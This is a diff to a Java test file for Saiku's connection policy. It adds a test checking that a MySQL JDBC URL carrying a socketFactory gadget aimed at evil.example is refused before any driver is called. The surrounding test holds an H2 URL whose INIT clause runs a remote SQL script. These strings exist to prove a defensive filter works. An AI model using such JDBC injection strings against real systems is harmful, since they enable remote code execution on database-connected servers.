@@ -70,6 +70,13 @@ public class SaikuConnectionPolicyChokepointTest {
     }
 
     @Test
+    public void olapConnection_refusesMysqlHostListSocketFactoryGadget_beforeAnyDriverIsAsked() throws Exception {
+        // SEC-confirmed bypass: the denied key rides inside the Connector/J host-property group.
+        assertRefusedBeforeDriver(new SaikuOlapConnection(
+                "evil", olapProps(mondrian("jdbc:mysql://(host=evil.example,socketFactory=com.evil.Factory)/db"))));
+    }
+
+    @Test
     public void olapConnection_refusesH2Init_beforeAnyDriverIsAsked() throws Exception {
         assertRefusedBeforeDriver(new SaikuOlapConnection(
                 "evil", olapProps(mondrian("jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://evil.example/p.sql'"))));
